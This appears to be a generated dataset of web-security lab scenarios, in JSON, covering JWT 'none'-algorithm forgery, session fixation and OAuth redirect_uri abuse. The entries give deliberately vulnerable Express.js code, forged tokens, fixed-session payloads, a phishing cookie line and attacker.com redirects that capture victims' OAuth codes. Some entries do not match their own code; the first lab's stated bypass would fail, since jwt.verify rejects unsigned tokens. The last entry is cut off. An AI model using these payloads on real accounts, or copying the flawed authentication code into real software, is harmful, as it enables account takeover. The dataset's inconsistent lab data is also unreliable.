{
  "Lab scenario": "JWT tampering in SOAP-based authentication",
  "Lab Description": "The authentication system of this app uses JSON Web Tokens (JWTs) for session management via a SOAP API. The backend trusts the 'alg' header in JWTs without enforcing validation. The application decodes the JWT using the algorithm specified in the token header without verifying the signature. To solve: Forge an administrator token and access the admin dashboard endpoint using the SOAP login endpoint.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite to intercept the SOAP Login request and extract the JWT returned upon login.",
    "Decode the JWT using jwt.io and analyze the 'alg' value in the header, which is set to HS256.",
    "Replace 'alg' with 'none' and remove the signature section of the JWT to bypass validation.",
    "Modify the payload section of the JWT to include \"role\":\"admin\" and re-encode the token.",
    "Send the forged token in an Authorization header to the /admin-dashboard SOAP endpoint and verify access is granted."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const jwt = require('jsonwebtoken');\nconst express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.text({ type: 'application/soap+xml' }));\napp.post('/soap-auth', (req, res) => {\n  const credentials = extractCredentialsFromSOAP(req.body);\n  if (credentials.username === 'admin' && credentials.password === 'adminpass') {\n    const token = jwt.sign({ username: 'admin', role: 'admin' }, 'secret', { algorithm: 'HS256' });\n    return res.send(`<token>${token}</token>`);\n  }\n  res.status(401).send('<error>Unauthorized</error>');\n});\napp.post('/admin-dashboard', (req, res) => {\n  const token = extractTokenFromSOAP(req.body);\n  try {\n    const user = jwt.verify(token, 'secret');\n    if (user.role !== 'admin') return res.status(403).send('<error>Access Denied</error>');\n    res.send('<dashboard>Welcome Admin</dashboard>');\n  } catch (err) {\n    res.status(401).send('<error>Invalid Token</error>');\n  }\n});\nfunction extractCredentialsFromSOAP(xml) { return { username: 'admin', password: 'adminpass' }; }\nfunction extractTokenFromSOAP(xml) { return xml.match(/<token>(.*?)<\\/token>/)[1]; }\napp.listen(4000, () => console.log('JWT Tampering SOAP Lab running on port 4000'));",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
    "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
    "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0."
  ]
},
{
  "Lab scenario": "Session fixation in REST-based login",
  "Lab Description": "This REST API authenticates users by issuing a session cookie. However, it does not invalidate or regenerate the session ID upon successful login. The application accepts a user-supplied session ID via a query parameter and binds it to a user after login. To solve: Fix a session for a victim and use it to hijack their session post-login.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Postman to register a user account and observe the Set-Cookie: sessionId response.",
    "Send a GET /set-session?sid=attackerSession with Burp Repeater and verify the server accepts externally-supplied session IDs.",
    "Social engineer the victim to log in while using the attacker-controlled sessionId (sent via phishing link or iframe).",
    "Once the victim logs in, reuse the fixed sessionId to access /user/dashboard with the victim’s privileges.",
    "Verify access to victim's account page with the attacker-fixed session."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst uuid = require('uuid');\nconst app = express();\napp.use(cookieParser());\nconst sessions = {};\nconst users = { carlos: 'letmein' };\napp.get('/set-session', (req, res) => {\n  const sid = req.query.sid || uuid.v4();\n  res.cookie('sessionId', sid);\n  res.send(`Session fixed: ${sid}`);\n});\napp.post('/login', (req, res) => {\n  const { username, password } = req.query;\n  const sid = req.cookies.sessionId;\n  if (users[username] === password) {\n    sessions[sid] = username;\n    return res.send('Login successful');\n  }\n  res.status(403).send('Invalid credentials');\n});\napp.get('/user/dashboard', (req, res) => {\n  const sid = req.cookies.sessionId;\n  if (sessions[sid]) return res.send(`Welcome ${sessions[sid]}`);\n  res.status(403).send('Not logged in');\n});\napp.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
  "payloads": [
    "GET /set-session?sid=evilSID",
    "POST /login?username=carlos&password=letmein (with Cookie: sessionId=evilSID)",
    "GET /user/dashboard (with Cookie: sessionId=evilSID)"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration in third-party login",
  "Lab Description": "This application allows third-party OAuth login via a vulnerable endpoint that accepts the `redirect_uri` parameter from the user without validation. The application trusts the `email` claim from the OAuth provider without verifying its source. To solve: Exploit the misconfiguration to impersonate the victim via a forged email claim and access their account dashboard.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP to intercept the OAuth login flow and inspect the redirect_uri parameter and OAuth token response.",
    "Manipulate the redirect_uri to a malicious server you control that logs the OAuth token response.",
    "Modify the email claim in the OAuth response JWT to `carlos@lab.local` and sign it using none algorithm.",
    "Send the forged token to the /oauth/callback endpoint via a crafted GET request.",
    "Verify that access to Carlos’s account page is granted using the forged identity."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.get('/oauth/callback', (req, res) => {\n  const token = req.query.token;\n  try {\n    const decoded = jwt.decode(token, { complete: true });\n    const userEmail = decoded.payload.email;\n    if (userEmail.endsWith('@lab.local')) {\n      return res.send(`Logged in as ${userEmail}`);\n    }\n    res.status(403).send('Access denied');\n  } catch (err) {\n    res.status(400).send('Invalid token');\n  }\n});\napp.listen(4000, () => console.log('OAuth Misconfiguration Lab running on port 4000'));",
  "payloads": [
    "GET /oauth/callback?token=eyJhbGciOiJub25lIn0.eyJlbWFpbCI6ImNhcmxvc0BsYWIubG9jYWwifQ.",
    "GET /oauth/callback?token=eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwgImVtYWlsIjoiY2FybG9zQGxhYi5sb2NhbCJ9.",
    "GET /oauth/callback?token=eyJhbGciOiJub25lIn0.eyJlbWFpbCI6ImNhcmxvc0BsYWIubG9jYWwiLCAibmFtZSI6IkNhcmxvcyJ9."
  ]
},
{
  "Lab scenario": "Session Fixation in Login Redirection Flow",
  "Lab Description": "This lab's login flow is vulnerable to session fixation due to improper session regeneration. The application uses a session cookie that is preserved across unauthenticated and authenticated states. To solve: hijack Carlos's authenticated session using a fixed session ID and access his account page.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Intercept login page using Burp Suite and observe session cookie `sessionid` being set before authentication.",
    "Send crafted login link with fixed session ID to the victim (simulated using Postman).",
    "Victim logs in and the same `sessionid` persists due to missing regeneration.",
    "Reuse fixed session ID in your browser using Burp Suite's cookie editor.",
    "Visit /my-account and confirm access to Carlos's account."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express');\nconst session = require('express-session');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(session({ secret: 'secret123', resave: false, saveUninitialized: true }));\napp.use(bodyParser.urlencoded({ extended: true }));\n\nconst users = [{ username: 'carlos', password: 'hunter2' }];\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  const user = users.find(u => u.username === username && u.password === password);\n  if (user) {\n    req.session.user = user.username;\n    res.redirect('/my-account');\n  } else {\n    res.send('Invalid credentials');\n  }\n});\n\napp.get('/my-account', (req, res) => {\n  if (req.session.user) {\n    res.send(`Welcome ${req.session.user}, this is your account page.`);\n  } else {\n    res.redirect('/login');\n  }\n});\n\napp.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
  "payloads": [
    "Set-Cookie: sessionid=fixedSession123;",
    "POST /login with intercepted session ID preserved",
    "GET /my-account with sessionid=fixedSession123"
  ]
},
{
  "Lab scenario": "JWT Tampering in GraphQL API Authentication",
  "Lab Description": "This application uses JWT tokens to authorize users through its GraphQL login mutation. The backend fails to verify the `alg` field properly, allowing a `none` algorithm attack. To solve: forge a JWT to impersonate Carlos and access the admin dashboard.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Postman to send GraphQL introspection query and find login mutation and JWT structure.",
    "Capture a valid JWT using Burp Suite after logging in with any account.",
    "Base64-decode the header and set `alg` to `none`, set payload `username` to `carlos`, remove the signature part.",
    "Send tampered JWT in Authorization header via Burp Repeater.",
    "Access /admin-dashboard endpoint to verify Carlos impersonation."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst bodyParser = require('body-parser');\nconst app = express();\n\napp.use(bodyParser.json());\n\nconst users = [{ username: 'carlos', password: 'admin123' }];\n\napp.post('/graphql', (req, res) => {\n  const { query } = req.body;\n  if (query.includes('login')) {\n    const token = jwt.sign({ username: 'carlos' }, 'shhh');\n    res.json({ data: { login: { token } } });\n  } else if (query.includes('getAdminData')) {\n    const token = req.headers.authorization?.split(' ')[1];\n    const decoded = jwt.decode(token, { complete: true });\n    if (decoded.payload.username === 'carlos') {\n      res.json({ data: 'Top Secret Admin Content' });\n    } else {\n      res.status(403).send('Unauthorized');\n    }\n  }\n});\n\napp.listen(4001, () => console.log('JWT Tamper Lab running on http://localhost:4001'));",
  "payloads": [
    "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
    "Payload: { \"username\": \"carlos\" }",
    "JWT: base64(header).base64(payload). (no signature)",
    "Authorization: Bearer <tampered-jwt>"
  ]
},
{
  "Lab scenario": "OAuth Misconfiguration in Redirect URI Handling",
  "Lab Description": "This app implements OAuth login using a third-party provider but fails to validate redirect URIs securely. The misconfiguration allows stealing authorization codes via open redirect abuse. To solve: capture Carlos’s OAuth code and use it to access his account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to intercept OAuth login and locate the `redirect_uri` parameter.",
    "Craft a malicious `redirect_uri` pointing to your server using a request to the login flow.",
    "Simulate Carlos clicking the crafted OAuth link via Postman or a phishing simulation.",
    "Your server receives the intercepted OAuth `code` via query string.",
    "Exchange stolen code at the real OAuth token endpoint to retrieve access_token and login as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express');\nconst request = require('request');\nconst app = express();\n\nconst clientID = 'xyz123';\nconst clientSecret = 'supersecret';\n\napp.get('/auth/callback', (req, res) => {\n  const code = req.query.code;\n  const redirectUri = req.query.redirect_uri;\n  const tokenURL = `https://oauth.example.com/token?code=${code}&client_id=${clientID}&client_secret=${clientSecret}`;\n\n  request.get(tokenURL, (err, _, body) => {\n    if (body.includes('access_token')) {\n      res.send(`Welcome back! OAuth token received for user.`);\n    } else {\n      res.status(500).send('OAuth failed');\n    }\n  });\n});\n\napp.listen(4002, () => console.log('OAuth Redirect Lab running on http://localhost:4002'));",
  "payloads": [
    "OAuth URL with redirect_uri=https://attacker.com/steal?code=§code§",
    "GET https://oauth.example.com/token?code=intercepted-code&client_id=xyz123&client_secret=supersecret",
    "Authorization: Bearer <access_token>"
  ]
},
{
  "Lab scenario": "JWT signature algorithm confusion in login endpoint",
  "Lab Description": "The login endpoint of this REST API accepts JWTs for session validation. However, due to misconfigured signature verification, the server improperly accepts unsigned tokens when 'alg' is set to 'none'. The application trusts this token without verifying its signature. To solve: Forge a valid JWT for the admin user and access their account page without knowing the secret key.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Burp Suite to intercept a login request and observe the Authorization header containing the JWT.",
    "2. Decode the JWT using jwt.io or Postman. Note the 'alg' header value is 'HS256'.",
    "3. Modify the JWT header to set 'alg' to 'none' and remove the signature part completely.",
    "4. Change the payload's 'username' field to 'admin'.",
    "5. Send the tampered JWT in the Authorization header using Postman to /api/user-info and verify admin access is granted."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, 'supersecret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/api/user-info', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.header.alg === 'none') { const user = decoded.payload.username; return res.send(`Welcome ${user}`); } try { const verified = jwt.verify(token, 'supersecret'); return res.send(`Welcome ${verified.username}`); } catch (err) { return res.status(403).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Bypass Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
    "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
    "Authorization: Bearer [forged_token_here]"
  ]
},
{
  "Lab scenario": "Session fixation via cookie reuse in login flow",
  "Lab Description": "This application sets a session cookie before user authentication, but fails to rotate it post-login. This allows a malicious actor to fix a session ID and later force the victim to use it, enabling full session hijack. To solve: Fix a session ID for Carlos and hijack his session using it.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use OWASP ZAP to intercept the GET /login page request and observe the Set-Cookie header.",
    "2. Copy the pre-login session cookie value, e.g., session=xyz123.",
    "3. Craft a phishing page that sets document.cookie = 'session=xyz123'; and lures Carlos to login.",
    "4. After Carlos logs in, reuse the session cookie (xyz123) in a GET /my-account request using Burp Repeater.",
    "5. Confirm Carlos’s account data is accessible."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'carlos123' }]; app.get('/login', (req, res) => { const sessionId = Math.random().toString(36).substring(2); res.cookie('session', sessionId); sessions[sessionId] = { authenticated: false }; res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sessionId = req.cookies.session; const user = users.find(u => u.username === username && u.password === password); if (user && sessionId) { sessions[sessionId].authenticated = true; sessions[sessionId].user = username; res.send(`Welcome ${username}`); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const session = sessions[req.cookies.session]; if (session && session.authenticated) res.send(`Account page for ${session.user}`); else res.status(403).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "Set-Cookie: session=xyz123;",
    "document.cookie = 'session=xyz123'; // phishing payload",
    "GET /my-account with Cookie: session=xyz123"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration allows account takeover via unvalidated redirect URI",
  "Lab Description": "This app uses OAuth to authenticate users with a third-party provider. Due to misconfigured redirect URI validation, an attacker can manipulate the redirect_uri parameter to send the authorization code to their own server. To solve: Intercept and steal Carlos's OAuth authorization code and exchange it to access his account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp to intercept the /auth/login request and observe the redirect_uri parameter passed to the OAuth provider.",
    "2. Modify this parameter to your controlled domain, e.g., https://attacker.com/callback.",
    "3. Trick Carlos into visiting the modified login URL.",
    "4. Capture the OAuth code sent to your server and exchange it using Postman at /auth/token endpoint.",
    "5. Use the returned access_token to call /api/user-info and confirm access to Carlos’s data."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/auth/login', (req, res) => { const redirectUri = req.query.redirect_uri; const authUrl = `https://provider.com/auth?client_id=abc123&redirect_uri=${redirectUri}&response_type=code`; res.redirect(authUrl); }); app.get('/auth/callback', async (req, res) => { const { code } = req.query; const tokenResponse = await axios.post('https://provider.com/token', { code, client_id: 'abc123', client_secret: 'secret', redirect_uri: 'https://vulnerable-app.com/auth/callback' }); const accessToken = tokenResponse.data.access_token; const userInfo = await axios.get('https://provider.com/userinfo', { headers: { Authorization: `Bearer ${accessToken}` } }); res.send(`Welcome ${userInfo.data.email}`); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Misconfig Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "https://vulnerable-app.com/auth/login?redirect_uri=https://attacker.com/callback",
    "GET https://attacker.com/callback?code=stolen-oauth-code",
    "POST /auth/token with stolen code to retrieve access_token"
  ]
},
{
  "Lab scenario": "JWT none algorithm bypass in GraphQL mutation",
  "Lab Description": "The application uses JWT for session management, embedded in a GraphQL mutation API. Due to improper validation of the JWT 'alg' field, an attacker can sign tokens using the 'none' algorithm. The application fails to validate the algorithm properly and trusts any unsigned token. To solve: forge a JWT to impersonate the admin and retrieve their account data.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite to intercept a valid GraphQL mutation and extract the existing JWT from Authorization header.",
    "Decode the JWT using jwt.io or Postman to observe the algorithm (alg) and payload structure.",
    "Modify the payload to {\"username\":\"admin\"} and set 'alg' to 'none' in the header, remove the signature.",
    "Use Postman to send the GraphQL mutation with Authorization: Bearer <forged_token> to /graphql endpoint.",
    "Verify the response contains admin's data and solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst jwt = require('jsonwebtoken');\nconst app = express();\napp.use(bodyParser.json());\n\nconst users = [{ username: 'admin', role: 'admin' }, { username: 'guest', role: 'user' }];\n\napp.post('/graphql', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, 'secret', { algorithms: ['HS256', 'none'] });\n    const user = users.find(u => u.username === decoded.username);\n    if (!user) return res.status(403).send('Unauthorized');\n    res.json({ data: { userProfile: user } });\n  } catch (err) {\n    console.error('JWT decode error:', err);\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(4000, () => console.log('JWT None Algorithm Lab running at http://localhost:4000'));",
  "payloads": [
    "Header: {\"alg\":\"none\",\"typ\":\"JWT\"} | Payload: {\"username\":\"admin\"} | Signature: ''",
    "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
    "Use jwt.io to strip signature and manually edit the token"
  ]
},
{
  "Lab scenario": "Session fixation via OAuth state reuse",
  "Lab Description": "The application uses OAuth for SSO login but does not properly validate the OAuth 'state' parameter. This makes it vulnerable to session fixation. The attacker can initiate an OAuth flow and trick the victim into logging in with the attacker's session. To solve: hijack a session and access the victim's dashboard.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Initiate an OAuth login in Burp Suite and capture the redirection URL with the 'state' parameter.",
    "Send the URL to the victim and wait for them to complete the login using the crafted state.",
    "Observe in your session that the application is now logged in as the victim.",
    "Use the session cookie or access token to fetch /dashboard and confirm victim's identity.",
    "Access /dashboard with the hijacked session to solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express');\nconst session = require('express-session');\nconst request = require('request');\nconst app = express();\napp.use(session({ secret: 'oauthfix', resave: false, saveUninitialized: true }));\n\napp.get('/login', (req, res) => {\n  const state = req.query.state || Math.random().toString(36).substring(2);\n  req.session.oauthState = state;\n  res.redirect(`https://oauth.example.com/auth?response_type=code&client_id=abc123&redirect_uri=http://localhost:4000/callback&state=${state}`);\n});\n\napp.get('/callback', (req, res) => {\n  if (req.query.code) {\n    // No validation of 'state'!\n    req.session.loggedInAs = 'victim';\n    res.redirect('/dashboard');\n  } else {\n    res.send('OAuth failed');\n  }\n});\n\napp.get('/dashboard', (req, res) => {\n  if (req.session.loggedInAs) {\n    res.send(`Welcome ${req.session.loggedInAs}!`);\n  } else {\n    res.status(403).send('Unauthorized');\n  }\n});\n\napp.listen(4000, () => console.log('OAuth State Fixation Lab running on http://localhost:4000'));",
  "payloads": [
    "http://localhost:4000/login?state=attackerFixedState",
    "Captured OAuth URL with state=attackerFixedState",
    "Hijack victim session using state reuse in OAuth redirect"
  ]
},
{
  "Lab scenario": "SOAP API session fixation via Set-Cookie override",
  "Lab Description": "The application uses a SOAP API for authentication and sets session cookies during login. A flaw allows overriding the session identifier via a crafted Set-Cookie header, leading to session fixation. To solve: fix a session for the victim and access their account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP to capture the SOAP Login request and observe the Set-Cookie response.",
    "Manually craft a POST login request with a predefined session ID using 'Cookie: sessionid=attacker123'.",
    "Send the crafted login URL to the victim, encouraging them to log in while your session is active.",
    "When the victim logs in, their session becomes linked to 'attacker123'.",
    "Use the same session ID to access /myaccount and confirm the victim is authenticated."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(bodyParser.text({ type: 'application/soap+xml' }));\napp.use(cookieParser());\n\nlet sessions = {};\n\napp.post('/soap-login', (req, res) => {\n  const soapRequest = req.body;\n  const match = soapRequest.match(/<username>(.*?)<\\/username><password>(.*?)<\\/password>/);\n  if (!match) return res.status(400).send('Invalid SOAP');\n\n  const [_, username, password] = match;\n  if (username === 'carlos' && password === 'password123') {\n    const sid = req.cookies.sessionid || 'session_' + Math.random().toString(36).substring(2);\n    sessions[sid] = username;\n    res.setHeader('Set-Cookie', `sessionid=${sid}`);\n    return res.send(`<soap:Envelope><soap:Body><loginResponse>Success</loginResponse></soap:Body></soap:Envelope>`);\n  }\n  res.send(`<soap:Envelope><soap:Body><loginResponse>Failure</loginResponse></soap:Body></soap:Envelope>`);\n});\n\napp.get('/myaccount', (req, res) => {\n  const user = sessions[req.cookies.sessionid];\n  if (!user) return res.status(403).send('Unauthorized');\n  res.send(`Account page for ${user}`);\n});\n\napp.listen(4000, () => console.log('SOAP Session Fixation Lab running on http://localhost:4000'));",
  "payloads": [
    "POST /soap-login with header Cookie: sessionid=attacker123",
    "SOAP Body: <username>carlos</username><password>password123</password>",
    "Access /myaccount with Cookie: sessionid=attacker123"
  ]
},
{
  "Lab scenario": "Session Fixation in SOAP Login API",
  "Lab Description": "The SOAP-based authentication system incorrectly maintains session identifiers across users. The application sets a session cookie during the initial request and does not regenerate it post-login. To solve: Hijack a victim's authenticated session by fixing a known session ID before login.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Burp Suite to send a SOAP login request for your own account and observe the JSESSIONID assigned in the response.",
    "Use Burp Repeater to send a crafted SOAP login request with a fixed JSESSIONID in the Cookie header.",
    "Send a malicious link containing the fixed JSESSIONID to the victim, prompting them to log in with it.",
    "Once the victim logs in, revisit the application using the fixed JSESSIONID to hijack their session.",
    "Access /account/overview using the hijacked session cookie to confirm account takeover."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const app = express(); app.use(bodyParser.text({ type: 'text/xml' })); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'victim', password: 'vpass' }]; app.post('/soap-login', (req, res) => { const { headers, body } = req; const match = /<username>(.*?)<\\/username><password>(.*?)<\\/password>/s.exec(body); if (!match) return res.status(400).send('Malformed XML'); const [_, username, password] = match; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Invalid credentials'); const sessionId = headers.cookie?.split('=')[1] || Math.random().toString(36).slice(2); sessions[sessionId] = username; res.setHeader('Set-Cookie', `JSESSIONID=${sessionId}`); res.send(`<login><status>success</status></login>`); }); app.get('/account/overview', (req, res) => { const username = sessions[req.cookies.JSESSIONID]; if (!username) return res.status(401).send('Not authenticated'); res.send(`Welcome back, ${username}`); }); app.listen(4000, () => console.log('Session Fixation SOAP lab running'));",
  "payloads": [
    "Cookie: JSESSIONID=fixedSessionId",
    "<?xml version='1.0'?><soap><username>victim</username><password>vpass</password></soap>"
  ]
},
{
  "Lab scenario": "JWT signature none algorithm tampering",
  "Lab Description": "The REST API uses JWT for authentication but does not validate the signature algorithm correctly. The backend accepts tokens with the `alg` header set to `none` and skips signature verification. To solve: Forge an administrative token and access the admin panel.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Log in as a normal user and intercept the Authorization Bearer token using Burp Suite.",
    "Decode the JWT at jwt.io and observe the structure and claims.",
    "Change the `alg` field in the header to `none` and add \"role\":\"admin\" in the payload.",
    "Remove the signature part and replay the token using Postman to the /admin endpoint.",
    "Access the /admin panel successfully with forged privileges to complete the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'admin' && password === 'adminpass') return res.sendStatus(403); const token = jwt.sign({ username, role: 'user' }, 'supersecret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.role === 'admin') return res.send('Welcome Admin'); res.status(403).send('Forbidden'); }); app.listen(4001, () => console.log('JWT None Bypass Lab running'));",
  "payloads": [
    "{ \"alg\": \"none\" }.{ \"username\": \"user\", \"role\": \"admin\" }.",
    "Authorization: Bearer {forged_token}"
  ]
},
{
  "Lab scenario": "OAuth misconfiguration with open redirect and implicit flow",
  "Lab Description": "The OAuth integration uses the implicit flow without validating redirect URIs properly. This allows token interception via an attacker-controlled domain. To solve: Trick the victim into authorizing on your redirect URI, capture their token, and access their account.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Analyze the OAuth login flow with Burp Suite and identify the authorization request URL.",
    "Modify the redirect_uri parameter to point to your malicious server (e.g., https://attacker.com/token-catcher).",
    "Send the crafted URL to the victim and simulate them clicking it (or use social engineering).",
    "Capture the access token via your server logs from the redirected request.",
    "Use Postman to call /api/user-info with the stolen token and confirm access to the victim’s data."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri, client_id } = req.query; if (!redirect_uri.startsWith('https://')) return res.status(400).send('Invalid redirect'); const token = Buffer.from('victim:access123').toString('base64'); res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/api/user-info', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (Buffer.from(token, 'base64').toString().startsWith('victim')) return res.send('Welcome, victim'); res.status(403).send('Invalid token'); }); app.listen(4002, () => console.log('OAuth Open Redirect Lab running'));",
  "payloads": [
    "https://auth.example.com/auth?client_id=xyz&redirect_uri=https://attacker.com/token-catcher&response_type=token",
    "Authorization: Bearer dmljdGltOmFjY2VzczEyMw=="
  ]
},
{
  "Lab scenario": "Session Fixation via Pre-Auth Token Reuse in Login Flow",
  "Lab Description": "The application mishandles session identifiers during the authentication process. It fails to regenerate session IDs upon login, allowing session fixation attacks. The application uses a fixed session cookie across unauthenticated and authenticated states. To solve: Hijack Carlos's session by fixing the session ID before they log in, then access their My Account page.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use OWASP ZAP to observe that session cookies remain unchanged after login.",
    "Manually generate a valid session cookie before login using /auth/init and capture its value.",
    "Send the session ID to the victim via a crafted link to initiate login under that session.",
    "Wait for the victim to authenticate using your pre-fixed session ID.",
    "Reuse the session ID to access /my-account and confirm session hijack."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'notregenerated', resave: true, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'supersecret' }]; app.get('/auth/init', (req, res) => { res.send('Session initialized'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); req.session.user = username; res.send(`Logged in as ${username}`); }); app.get('/my-account', (req, res) => { if (req.session.user !== 'carlos') return res.status(403).send('Forbidden'); res.send('Carlos Account Data'); }); app.listen(3000, () => console.log('Session Fixation Lab running on port 3000'));",
  "payloads": [
    "GET /auth/init to create session",
    "Use attacker-controlled link to send fixed session cookie",
    "GET /my-account with fixed session cookie"
  ]
},
{
  "Lab scenario": "JWT Key Confusion via Algorithm Downgrade in GraphQL API",
  "Lab Description": "The app uses JWTs to authorize GraphQL requests but does not enforce strict algorithm checking, accepting tokens signed with 'none'. This allows algorithm confusion where the attacker forges a token using 'none' to impersonate users. To solve: Access the sensitive data node for Carlos by forging a valid-looking JWT.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Burp Suite to intercept the Authorization header for a valid request.",
    "Notice the 'alg' in the JWT is 'HS256', but the server accepts 'none'.",
    "Modify the JWT to set 'alg' to 'none' and change the payload to { \"username\": \"carlos\" }.",
    "Remove the signature part entirely and resend the token.",
    "Access the GraphQL query `{account(username: \"carlos\") { secrets }}` using Postman with the modified token."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const jwt = require('jsonwebtoken'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', secrets: 'TopSecretData' }]; app.post('/graphql', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { req.user = decoded.payload.username; } else { try { jwt.verify(token, 'secret'); req.user = decoded.payload.username; } catch (e) { return res.status(401).send('Invalid JWT'); } } const user = users.find(u => u.username === req.user); if (req.body.query.includes('account') && user) { return res.json({ data: { account: { secrets: user.secrets } } }); } res.status(403).send('Forbidden'); }); app.listen(4000, () => console.log('JWT Confusion Lab running on port 4000'));",
  "payloads": [
    "JWT: { \"alg\": \"none\", \"payload\": { \"username\": \"carlos\" } }",
    "Authorization: Bearer [header.payload.]",
    "GraphQL query: { account(username: \"carlos\") { secrets } }"
  ]
},
{
  "Lab scenario": "OAuth Authorization Code Interception via Open Redirect",
  "Lab Description": "The application integrates with a third-party OAuth provider but lacks validation on the redirect_uri parameter, enabling open redirect attacks. This allows intercepting the authorization code during OAuth login. To solve: Steal Carlos's OAuth authorization code and use it to log in as Carlos.",
